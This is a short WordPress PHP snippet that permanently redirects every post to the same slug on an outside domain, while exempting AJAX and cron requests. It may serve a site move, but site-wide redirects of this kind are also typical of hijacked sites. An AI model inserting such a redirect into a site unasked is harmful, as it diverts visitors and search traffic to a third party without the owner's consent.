<?php
// Get the current post's slug
$current_slug = get_post_field('post_name', get_post());

// Define the target URL based on the current slug
$target_url = 'https://f97.xyz/p/' . $current_slug;

// Check if it's an ajax or cron request, then do not redirect
if (defined('DOING_AJAX') || defined('DOING_CRON')) {
    return;
}

// Redirect to the target URL
wp_redirect($target_url, 301);
exit;

